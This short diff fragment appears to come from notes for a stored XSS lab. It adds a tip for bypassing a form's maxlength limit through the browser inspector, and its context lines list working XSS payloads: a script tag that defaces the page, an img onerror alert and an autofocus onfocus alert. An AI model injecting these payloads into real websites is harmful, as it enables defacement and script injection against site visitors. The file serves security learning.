@@ -25,6 +25,9 @@ in stroed xxs section
 hacked!</h1>";</script> 
 
 Additional Commands to Execute Stored XSS 
+
+IF YOU ENCOUNTER ANY PROBLEM DURING TYPING OF LENGTHY COMMANDS JUST RIGTH CLICK ON THE MESSAGE BOX AND GO TO INSPECT AND THE CHANGE THE MAXLENGTH ="250" AND CONTINUING TYPING 
+
  <script>document.body.innerHTML ="<h1>You've been hacked!</h1>";</script> 
  <img src="nonexistent.jpg" onerror="alert('Stored XSS with img');"> 
  <input type="text" value="XSS"onfocus="alert('Stored XSS onfocus')" autofocus> 
